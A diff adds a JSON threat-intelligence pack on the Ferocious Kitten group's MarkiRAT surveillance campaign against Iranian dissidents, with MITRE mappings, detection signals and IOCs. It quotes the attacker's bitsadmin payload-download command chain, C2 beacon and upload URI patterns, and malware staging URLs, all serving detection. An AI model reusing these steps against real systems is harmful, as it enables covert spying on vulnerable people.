@@ -1,0 +1,333 @@
+{
+  "report_title": "Ferocious Kitten (MarkiRAT) Actor Intelligence Pack — Stage-1 CTI Extraction",
+  "source": "Kaspersky Securelist 'Ferocious Kitten: 6 years of covert surveillance in Iran' (2021-06-16, https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/); Kaspersky press release 'A 6-year cyberespionage campaign uncovered in the Middle East' (https://www.kaspersky.com/about/press-releases/a-6-year-cyberespionage-campaign-uncovered-in-the-middle-east); Picus Security 'Ferocious Kitten APT Exposed' MITRE mapping (https://www.picussecurity.com/resource/blog/ferocious-kitten-apt-exposed-inside-the-iran-focused-espionage-campaign)",
+  "publication_date": "2026-08-31",
+  "actor": {
+    "name": "Ferocious Kitten",
+    "mitre_id": "",
+    "mitre_canonical_name": "",
+    "aliases": [
+      "Ferocious Kitten"
+    ],
+    "related_clusters": [
+      "Domestic Kitten / APT-C-50 (separate Iran-nexus domestic-surveillance actor; Kaspersky notes overlapping TTPs and shared targeting of Iranian citizens, but does NOT merge the two)",
+      "Rampant Kitten (Check Point 2020 report on Iranian domestic espionage; some overlap in Persian-dissident targeting and Telegram-focused tooling — separate cluster, not the same group)"
+    ],
+    "attribution": "Iran-nexus, domestically focused cyber-espionage / surveillance group active since at least 2015, targeting Persian-speaking individuals — apparently Iranian dissidents, activists and opposition figures — who appear to be located inside Iran. Decoy content (anti-regime Persian political messaging, imagery of protests and political prisoners) is designed to lure the regime's own opponents, and interface/repository text, Persian keyboard-layout gating and Persian file names are consistent with an operator serving Iranian domestic-surveillance interests. Kaspersky observed TTP overlap with the Iran-based Domestic Kitten (APT-C-50) operation but treats Ferocious Kitten as a distinct cluster and did not attribute it to a named government entity or established APT group.",
+    "attribution_confidence": "medium",
+    "targeted_regions_mena": [
+      "Iran"
+    ],
+    "targeted_regions_global": [],
+    "targeted_sectors": [
+      "Individuals / dissidents / activists (Persian-speaking Iranian citizens)",
+      "Civil society / opposition",
+      "Journalists and regime critics (inferred from decoy themes)"
+    ],
+    "key_campaigns": [
+      {
+        "name": "Persian-dissident surveillance campaign (MarkiRAT)",
+        "date": "2015 to 2021 (2021 decoy documents observed by Kaspersky)",
+        "summary": "Multi-year covert surveillance of Persian-speaking targets in Iran using the custom MarkiRAT Windows implant. Delivery via macro-weaponized Persian-language Word documents whose decoy content references anti-regime protest and political prisoners. Macros convert an embedded hex blob into update.exe (dropped to the Public folder) and copy it to the Startup folder as svehost.exe for persistence. MarkiRAT records keystrokes and clipboard, captures screenshots (scr.jpg), enumerates and exfiltrates documents of interest, and executes arbitrary commands via cmd.exe. Variants piggy-back on Telegram (data.exe with Telegram icon, tdata-directory search, shortcut hijack) and Chrome (mklgsecondary/mklgchrome, chrome.txt fetched via BITS/bitsadmin job 'pdj', Chrome shortcut modification). RTLO is used to disguise executables as media files. C2 is HTTP-based (updatei.com and *.com-view impersonation domains). An Android component (classes.dex / hr.apk hosted on updatei.com) was also observed.",
+        "source_url": "https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"
+      }
+    ]
+  },
+  "threat_actors": ["Ferocious Kitten"],
+  "targeted_regions": ["Iran"],
+  "targeted_sectors": ["Individuals / dissidents / activists", "Civil society / opposition", "Journalists and regime critics"],
+  "malware": [
+    "MarkiRAT (custom Windows RAT / surveillance implant; PDB internal names mklg / mfcmklg / mklgsecondary / mklgchrome / mklgtelegram / mfcdownl — 'Mark KeyLogger')",
+    "MarkiRAT Telegram variant (data.exe, Telegram-shortcut hijack)",
+    "MarkiRAT Chrome variant (mklgsecondary + mklgchrome, chrome.txt)",
+    "MarkiRAT downloader (mfcdownl.pdb)",
+    "Android implant (classes.dex / hr.apk on updatei[.]com)"
+  ],
+  "tooling_observed": [
+    "bitsadmin (Windows BITS client, LOLBin)",
+    "cmd.exe",
+    "VBA macros (weaponized .doc)",
+    "Right-to-Left Override (RTLO / U+202E)"
+  ],
+  "ttps": [
+    {
+      "technique_id": "T1566.001",
+      "technique_name": "Phishing: Spearphishing Attachment",
+      "tactic": "initial-access",
+      "procedure_description": "Delivers macro-weaponized Persian-language Microsoft Word documents (e.g. 'همبستگی عاشقانه با عاشقان آزادی2.doc') whose decoy content references anti-regime protest, political prisoners and opposition themes tailored to lure Persian-speaking dissidents inside Iran.",
+      "observed_tooling": ["VBA macros (weaponized .doc)"],
+      "detection_feasibility": "medium — malicious Office attachments are detectable at the mail gateway and via Office child-process/macro telemetry, but the decoy is document content the endpoint only sees on open; targeting Persian-speaking individuals limits enterprise mail-flow visibility",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"]
+    },
+    {
+      "technique_id": "T1204.002",
+      "technique_name": "User Execution: Malicious File",
+      "tactic": "execution",
+      "procedure_description": "Relies on the victim opening the decoy .doc and enabling macros; the document must be opened and macro execution allowed for the MarkiRAT dropper chain to run.",
+      "observed_tooling": ["VBA macros (weaponized .doc)"],
+      "detection_feasibility": "medium — WINWORD.EXE spawning script/child processes and macro-enable events are observable via process-lineage and Office macro telemetry",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/", "https://www.picussecurity.com/resource/blog/ferocious-kitten-apt-exposed-inside-the-iran-focused-espionage-campaign"]
+    },
+    {
+      "technique_id": "T1059.005",
+      "technique_name": "Command and Scripting Interpreter: Visual Basic",
+      "tactic": "execution",
+      "procedure_description": "The document macro (VBA) decodes an embedded hexadecimal blob into a PE executable, writes it to the Public folder as update.exe, and executes it — the initial in-document code path that stages MarkiRAT.",
+      "observed_tooling": ["VBA macros (weaponized .doc)"],
+      "detection_feasibility": "high — VBA macro execution that writes and launches a PE from the Public folder is detectable via macro/script-block logging, Office child-process creation, and file-write-then-execute correlation",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"]
+    },
+    {
+      "technique_id": "T1547.001",
+      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+      "tactic": "persistence",
+      "procedure_description": "Copies the dropped payload (update.exe) into the user Startup folder as svehost.exe so MarkiRAT re-executes at every logon.",
+      "observed_tooling": [],
+      "detection_feasibility": "high — creation of an executable named svehost.exe in the Startup folder is directly observable via file-creation monitoring of Startup paths and autoruns baselining; the masquerading name (svehost vs svchost) is a strong watchlist item",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"]
+    },
+    {
+      "technique_id": "T1547.009",
+      "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification",
+      "tactic": "persistence",
+      "procedure_description": "Telegram variant searches for the 'tdata' directory, copies MarkiRAT as data.exe with the Telegram icon, and modifies the Telegram shortcut to launch the malware alongside the legitimate app. The Chrome variant likewise modifies the Chrome shortcut so the payload executes whenever the browser is launched.",
+      "observed_tooling": [],
+      "detection_feasibility": "high — modification of Telegram/Chrome .lnk target paths to chain a secondary executable is detectable via shortcut-file change monitoring and process-lineage showing the browser/messenger launching an unexpected child from a user-writable path",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"]
+    },
+    {
+      "technique_id": "T1197",
+      "technique_name": "BITS Jobs",
+      "tactic": "persistence",
+      "procedure_description": "Chrome variant abuses the Windows BITS service via bitsadmin to fetch payloads: 'bitsadmin /cancel pdj > bitsadmin /create pdj > bitsadmin /SetPriority pdj HIGH > bitsadmin /addfile pdj [URL] %PUBLIC%\\AppData\\Libs\\p.b > bitsadmin /resume pdj' — downloading chrome.txt / p.b. BITS is also used to probe outward-facing IP / proxy information.",
+      "observed_tooling": ["bitsadmin (Windows BITS client, LOLBin)"],
+      "detection_feasibility": "high — bitsadmin.exe command-line execution with job name 'pdj' and BITS-Client operational-log transfer events to unexpected hosts are high-fidelity, actor-specific detections",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/", "https://www.picussecurity.com/resource/blog/ferocious-kitten-apt-exposed-inside-the-iran-focused-espionage-campaign"]
+    },
+    {
+      "technique_id": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "tactic": "command-and-control",
+      "procedure_description": "Retrieves additional payloads/components from C2 — the MarkiRAT 'download' command pulls files from the C2, the Chrome-stage 'chrome.txt' and 'p.b' are fetched (including via BITS), and the Android component (classes.dex / hr.apk) is hosted on updatei[.]com.",
+      "observed_tooling": ["bitsadmin (Windows BITS client, LOLBin)"],
+      "detection_feasibility": "medium — file downloads following the initial foothold are detectable via proxy/DNS to the C2 domains and file-write telemetry, but HTTP downloads blend with normal traffic absent the specific IOC domains",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"]
+    },
+    {
+      "technique_id": "T1036.002",
+      "technique_name": "Masquerading: Right-to-Left Override",
+      "tactic": "stealth",
+      "procedure_description": "Uses the RTLO Unicode character (U+202E) to reverse executable file names so that .exe payloads appear to the victim as benign media files (e.g. .jpg / .mp4), aiding social-engineering execution.",
+      "observed_tooling": ["Right-to-Left Override (RTLO / U+202E)"],
+      "detection_feasibility": "medium — file names containing the U+202E control character are detectable via filename-scanning heuristics on downloaded/dropped files, but require tooling that inspects for the RTLO codepoint",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/", "https://www.picussecurity.com/resource/blog/ferocious-kitten-apt-exposed-inside-the-iran-focused-espionage-campaign"]
+    },
+    {
+      "technique_id": "T1036.005",
+      "technique_name": "Masquerading: Match Legitimate Resource Name or Location",
+      "tactic": "stealth",
+      "procedure_description": "Names payloads to blend in with trusted software: the Startup copy is 'svehost.exe' (mimicking svchost.exe), and the Telegram-hijack copy 'data.exe' is given the legitimate Telegram icon and placed within the Telegram data directory.",
+      "observed_tooling": [],
+      "detection_feasibility": "medium — names/icons that mimic legitimate binaries in user-writable locations are detectable via name/path baselining and signature-vs-name/icon mismatch, but need endpoint context",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"]
+    },
+    {
+      "technique_id": "T1518.001",
+      "technique_name": "Software Discovery: Security Software Discovery",
+      "tactic": "discovery",
+      "procedure_description": "Enumerates running processes to detect security products and reports the result to C2 via a 'k' parameter (value '1' when Kaspersky/exe.exe is present, '3' for Bitdefender/bdagent.exe). No behavioral change was observed on detection, but the check shapes operator awareness.",
+      "observed_tooling": [],
+      "detection_feasibility": "low — in-memory process enumeration to fingerprint AV leaves little discrete host signal; hunt candidate via API-behavior/EDR sensor telemetry rather than a discrete event",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/", "https://www.picussecurity.com/resource/blog/ferocious-kitten-apt-exposed-inside-the-iran-focused-espionage-campaign"]
+    },
+    {
+      "technique_id": "T1057",
+      "technique_name": "Process Discovery",
+      "tactic": "discovery",
+      "procedure_description": "Enumerates the running process list (used both for security-software fingerprinting and to locate/kill the KeePass process before keylogging to encourage credential re-entry).",
+      "observed_tooling": [],
+      "detection_feasibility": "low — process enumeration is ubiquitous and largely benign; only meaningful as a hunt in tight process-lineage context around the implant",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"]
+    },
+    {
+      "technique_id": "T1614.001",
+      "technique_name": "System Location Discovery: System Language Discovery",
+      "tactic": "discovery",
+      "procedure_description": "Checks for the Persian keyboard layout (locale ID 0x0429) before engaging keystroke logging — gating collection to Persian-speaking (Iran-based) victims, consistent with the group's domestic-surveillance targeting.",
+      "observed_tooling": [],
+      "detection_feasibility": "low — keyboard-layout / locale API queries are common and produce little discrete telemetry; hunt-only signal, valuable mainly as a malware-analysis triage indicator",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"]
+    },
+    {
+      "technique_id": "T1056.001",
+      "technique_name": "Input Capture: Keylogging",
+      "tactic": "collection",
+      "procedure_description": "Core MarkiRAT function ('Mark KeyLogger', per PDB names mklg*): records the victim's keystrokes to a local log file ('nfo') for exfiltration; kills KeePass beforehand to force password re-entry that can then be captured.",
+      "observed_tooling": [],
+      "detection_feasibility": "low — user-mode keystroke hooking is difficult to distinguish behaviorally; hunt candidate via EDR API-hook telemetry and the 'nfo' log-file artifact rather than a reliable log event",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/", "https://www.picussecurity.com/resource/blog/ferocious-kitten-apt-exposed-inside-the-iran-focused-espionage-campaign"]
+    },
+    {
+      "technique_id": "T1115",
+      "technique_name": "Clipboard Data",
+      "tactic": "collection",
+      "procedure_description": "Captures the contents of the Windows clipboard alongside keystroke logging to harvest copied credentials, messages and other sensitive text.",
+      "observed_tooling": [],
+      "detection_feasibility": "low — clipboard reads via native APIs are not reliably logged; hunt-only, best surfaced via EDR behavioral sensors",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"]
+    },
+    {
+      "technique_id": "T1113",
+      "technique_name": "Screen Capture",
+      "tactic": "collection",
+      "procedure_description": "Captures desktop screenshots, saving them locally as 'scr.jpg' prior to exfiltration to C2.",
+      "observed_tooling": [],
+      "detection_feasibility": "medium — the creation of a screenshot artifact named scr.jpg in the malware working directory is detectable via file-creation monitoring of the implant's repository path; the screen-capture API call itself is low-signal",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"]
+    },
+    {
+      "technique_id": "T1010",
+      "technique_name": "Application Window Discovery",
+      "tactic": "discovery",
+      "procedure_description": "Collects foreground/active application window titles and includes them in the initial C2 registration POST (embedded '<b>Windows Title1</b>...<b>Windows Title2</b>') to give the operator context on victim activity.",
+      "observed_tooling": [],
+      "detection_feasibility": "low — window-title enumeration produces no reliable discrete host event; hunt-only, of value mainly during malware analysis",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"]
+    },
+    {
+      "technique_id": "T1083",
+      "technique_name": "File and Directory Discovery",
+      "tactic": "discovery",
+      "procedure_description": "The 'smart dir/upload/fulldir' commands perform intelligent file discovery across Desktop, Documents, Pictures, Downloads and messaging-app directories (ViberPC, Skype, Telegram) to locate documents of interest for exfiltration.",
+      "observed_tooling": [],
+      "detection_feasibility": "low — directory enumeration is common and noisy; meaningful only as a hunt within the implant's process-lineage window",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"]
+    },
+    {
+      "technique_id": "T1005",
+      "technique_name": "Data from Local System",
+      "tactic": "collection",
+      "procedure_description": "Collects documents and sensitive files from the local system for exfiltration, targeting specific extensions via the 'upload/uploads/uploadsf' commands: .rtf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pps, .ppsx, .txt, .gpg, .pkr, .kdbx, .key, .jpg (note the inclusion of PGP/keyring and KeePass database extensions — targeting of encryption keys and password stores).",
+      "observed_tooling": [],
+      "detection_feasibility": "low — local file collection resembles normal user activity; better addressed as a hunt over access to sensitive extensions (.kdbx/.gpg/.pkr) and honeytoken files than a reliable real-time detection",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"]
+    },
+    {
+      "technique_id": "T1059.003",
+      "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
+      "tactic": "execution",
+      "procedure_description": "Executes operator-supplied arbitrary commands on the victim via 'cmd.exe /c', and runs files from its own repository directory (the 'runinhome' command).",
+      "observed_tooling": ["cmd.exe"],
+      "detection_feasibility": "medium — cmd.exe /c spawned by the MarkiRAT implant process is detectable via process-lineage (unexpected parent), though cmd.exe use itself is common and needs parent-process context",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"]
+    },
+    {
+      "technique_id": "T1071.001",
+      "technique_name": "Application Layer Protocol: Web Protocols",
+      "tactic": "command-and-control",
+      "procedure_description": "Communicates with C2 over HTTP(S): initial registration POST to /i.php?u=[computername]_[username]&i=[IP]; periodic beacon GET to /ech/echo.php?req=rr&u=[computername]_[username] (expecting response '3 LOK 0'); directory listing via /ech/rite.php. C2 domains include updatei[.]com and *.com-view impersonation domains.",
+      "observed_tooling": [],
+      "detection_feasibility": "medium — the fixed URI patterns (/i.php, /ech/echo.php?req=rr, /ech/rite.php) and the '3 LOK 0' response are strong network-signature candidates on proxy/IDS, but require the specific IOCs since the transport is ordinary HTTP",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/", "https://www.picussecurity.com/resource/blog/ferocious-kitten-apt-exposed-inside-the-iran-focused-espionage-campaign"]
+    },
+    {
+      "technique_id": "T1041",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "tactic": "exfiltration",
+      "procedure_description": "Exfiltrates collected files (documents, keystroke log 'nfo', screenshot 'scr.jpg') to the C2 via HTTP upload to /up/uploadx.php?u=[computername]_[username].",
+      "observed_tooling": [],
+      "detection_feasibility": "medium — outbound HTTP POST uploads to the /up/uploadx.php endpoint on the C2 domains are detectable via proxy/network telemetry when the IOC domains/URI are known",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"]
+    },
+    {
+      "technique_id": "T1027",
+      "technique_name": "Obfuscated Files or Information",
+      "tactic": "stealth",
+      "procedure_description": "The weaponized document embeds the MarkiRAT payload as a hexadecimal blob that the macro decodes at runtime into a PE, rather than shipping a plain executable — obfuscating the payload from static document inspection.",
+      "observed_tooling": ["VBA macros (weaponized .doc)"],
+      "detection_feasibility": "medium — macro code that decodes a large hex/embedded blob and writes a PE is detectable via script-block/macro content heuristics and drop-then-execute correlation",
+      "sources": ["https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"]
+    }
+  ],
+  "detection_signals": [
+    "Microsoft Word (WINWORD.EXE) spawning a child process or writing a PE to the Public folder (update.exe) immediately after a Persian-language .doc is opened with macros enabled",
+    "Creation of an executable named svehost.exe in the user Startup folder (masquerades as svchost.exe) — high-fidelity autostart watchlist item",
+    "Modification of Telegram or Chrome .lnk shortcuts to launch a secondary executable, and a data.exe carrying the Telegram icon placed in/near the Telegram tdata directory",
+    "bitsadmin.exe execution creating/resuming a BITS job named 'pdj', addfile targeting %PUBLIC%\\AppData\\Libs\\p.b, and BITS-Client transfer events to unexpected external hosts (chrome.txt / p.b download)",
+    "File names containing the RTLO/U+202E control character disguising .exe payloads as media (.jpg/.mp4)",
+    "MarkiRAT working-directory artifacts: repository %PUBLIC%\\AppData\\Windows, keystroke log file 'nfo', screenshot 'scr.jpg'",
+    "HTTP C2 URI patterns: /i.php?u=[host]_[user]&i=[ip] (registration POST), /ech/echo.php?req=rr&u=[host]_[user] (beacon, response '3 LOK 0'), /ech/rite.php (dir listing), /up/uploadx.php (file upload)",
+    "DNS/HTTP to updatei[.]com, microsoft.com-view[.]space, aparat.com-view[.]space, khabarfarsi.com-view[.]org",
+    "Requests to hxxp://updatei[.]com/ddd/classes.dex or hxxp://updatei[.]com/hr.apk (Android component staging)",
+    "Mutex Global\\{2194ABA1-BFFA-4e6b-8C26-D1BB20190312} present on host",
+    "Process enumeration checking for exe.exe (Kaspersky) / bdagent.exe (Bitdefender) and termination of the KeePass process prior to credential capture",
+    "Access/collection of KeePass (.kdbx) and PGP keyring (.gpg/.pkr/.key) files by a non-interactive process"
+  ],
+  "iocs": {
+    "ips": [],
+    "domains": [
+      "updatei.com",
+      "microsoft.com-view.space",
+      "aparat.com-view.space",
+      "khabarfarsi.com-view.org"
+    ],
+    "emails": [],
+    "hashes": [
+      "E7986CD2D31EDD7CCB872DC1F0F745BE6A483676CE0291F3C88B94B0E2306EA0",
+      "2E8288C4603A04281127055B749E246ABFD7F6B0F261BFF96A47959DCAE4EE39",
+      "7699C50E8FED564B83FB0996E700FE51900E4F67CEC4E669ED431E6A6F120865",
+      "FA9C0E0CB88B34D51DEB257639314CF54CB11F9867A27579521681A2E17DA4C4",
+      "489B895AD66F13C2A4FFEB218E735CACE2B23D36FA55CD07B7EDB4FBC03048CB",
+      "AB3E9F65C60C1760AFC99629CAEE7FAB8DBA117A16A7F9F843EC43617E824B0D",
+      "54BD9FE21289FAC0D48CC388AA35ECDC854D8C81865564DCB21FC1D73D22B86B",
+      "3A4EF9B7BD7F61C75501262E8B9E31F9E9BC3A841D5DE33DCDEB8AAA65E95F76",
+      "274BEB57AE19CBC5C2027E08CB2B718DEA7ED1ACB21BD329D5ABA33231FB699D",
+      "B71C87AD8A0D179FC317656B339A57F2775B773C0FC54EA2B0B8D171B7AF7A8A",
+      "A7C25D943F8B8689B4A55771349DD7B746FEC094E5CC3F693C90801560A1808C",
+      "405DEB3A129DF7B56357966B723A14C0AA9BC3615E2A20FCCD7D2B5A8CEAB30D",
+      "636FEE51245685DE8F85D2D8AF1DD1351267DBB9F9E571685A76D3894ED931DA",
+      "1E21645147AA4EAC33495AA1713FFA30DEF0758F810CA944580A14BE2828643D",
+      "D723B7C150427A83D8A08DC613F68675690FA0F5B10287B078F7E8D50D1A363F",
+      "3C94EBA2E2B73B2D2230A62E4513F457933D4668221992C71C847B79BA12F352",
+      "5B4B42A8A730FAE1B786326F27613DA4",
+      "91EBDE892ED57F19C0CBAB98D04648CE",
+      "7C83EC6D8459AC989669899071F41AE1",
+      "B2FE8C3BA2B9639F34C1727D50C4918D",
+      "4F1C9411739F7D3E5E418D4CD264E9A3",
+      "698201F289110A6DCFF75407AB02E917",
+      "61DA1A5FA3D0D4E69A9EA6AF53A91E45",
+      "254A065A2C9CF8FF6BDD98EC120B3222",
+      "6747E3953775FB226DA0723A94490FDB",
+      "D22D9CE61E6AEA72AA9A8A233530DB43",
+      "F9509755C5781F87788FFDF9EFAD075D",
+      "CE5A7612892F27299362AE0569507E04",
+      "B0632B202EB5D204DF112E1B5BAC3F21",
+      "3D6D731F03A0FCF4DB9506FF9BDB7231",
+      "1FE34D84A058156296E86888DDD5CAC9",
+      "C888F680B9BC3AABF0EC1CDD312436B5",
+      "8187B9A9AF3EB78EE3B1190BB1DB967E",
+      "E43E11B074FA7B071DEC9BC294E0F95C",
+      "736331C23D1813278C458B5EA8334AB14511AFA6",
+      "9BCF60F1C806947DBBB0729F2E07496ABE1B47B7",
+      "1B9908CEC557879382B63F071EC710BE5B68EE79",
+      "A1DD1AEE6BB3EE3F8C3CEE08955F3285C4E95439",
+      "B59910F3AD87010140100EA63B9A474136BB5A97",
+      "397C359064C5282276B7717731A6FDB998C31A0F",
+      "93AE9778E55764F05E7D637E10A0D77EC3F6F6F7",
+      "F37003A6B6896D233A019E0E672FD9E92D261FC0",
+      "9923473C594FF12904E37A2405F619A7DC98D905",
+      "3E30D4DA7AA25CA8D44851848B05EFF758CEEB46",
+      "609D4099CA91A494B22738E2050DD8CF12C61917",
+      "4C33552788239DCF044CDDEE51D2000F04509FC1",
+      "83E00F2E844795606B90C314495E91932B14F863",
+      "B7B6345D9107CF7997646F3B04ED423C1271D070",
+      "B831C659335F669F7C2B48ABE281F066BE75D7AF",
+      "C2E9EAE6F870737DD4B6A6057BAC35FF7CC5E244",
+      "FFB76C958C1B53AF09913C268C8E90F873D53F1A"
+    ],
+    "cves": []
+  },
+  "yara_rules": [],
+  "confidence": "medium",
+  "notes": "Single primary source: Kaspersky Securelist 'Ferocious Kitten: 6 years of covert surveillance in Iran' (2021-06-16), the only in-depth technical report on this actor, enriched with the Kaspersky press release and Picus Security's derived MITRE mapping (secondary/narrative). Because attribution and TTPs rest largely on one original research team without independent corroboration, overall confidence is MEDIUM. ALIAS GATE: aliases[] contains only 'Ferocious Kitten' — Kaspersky did not publish additional own-names for this cluster. Domestic Kitten (APT-C-50) and Rampant Kitten are noted in related_clusters, NOT merged: Kaspersky observed TTP/targeting overlap but explicitly treats Ferocious Kitten as distinct, and neither belongs to the existing rocket-kitten/charming-kitten/imperial-kitten/ballistic-kitten slugs. actor.mitre_id / mitre_canonical_name left empty: Ferocious Kitten has no assigned MITRE ATT&CK Group ID. MITRE mapping: every technique_id was validated against this environment's bundled ATT&CK dataset before inclusion (zero invalid IDs); defense-evasion techniques use this environment's tactic slug 'stealth' (T1036.002, T1036.005, T1027) consistent with the sibling pioneer-kitten pack. T1059.005 (VBA), T1547.001 (svehost.exe Startup), T1547.009 (Telegram/Chrome shortcut hijack), T1197 (bitsadmin 'pdj'), T1071.001 (fixed HTTP URI patterns) and T1113 (scr.jpg artifact) are the strongest detection surfaces; keylogging/clipboard/window-title/language-check collection behaviors are hunt-only (low feasibility). IOCs are taken verbatim from the Kaspersky report: hashes[] holds 16 SHA-256, 18 MD5 and 18 SHA-1 sample hashes (two SHA-256 values from the report were dropped because the retrieved copy rendered them at 62/63 hex characters rather than a valid 64, and are omitted rather than guessed); domains are the four attacker C2 / impersonation domains (updatei.com plus the microsoft/aparat/khabarfarsi 'com-view' typosquats) — no attacker IPs were enumerated in the source, so ips[] is empty. CVEs left empty: the Picus write-up mentions CVE-2021-40444 (MSHTML), but that vulnerability was disclosed in September 2021 — after the June 2021 Kaspersky report and its observed activity — so it is treated as an anachronistic/unsupported claim and excluded rather than fabricated. Android staging URLs (updatei[.]com/ddd/classes.dex, updatei[.]com/hr.apk) and host artifacts (mutex Global\\{2194ABA1-BFFA-4e6b-8C26-D1BB20190312}, files nfo/scr.jpg/update.exe/svehost.exe/data.exe/chrome.txt/p.b, repository %PUBLIC%\\AppData\\Windows) are captured in detection_signals rather than the network/host IOC object. No YARA rules were published in the source, so yara_rules is empty (none authored from scratch)."
+}
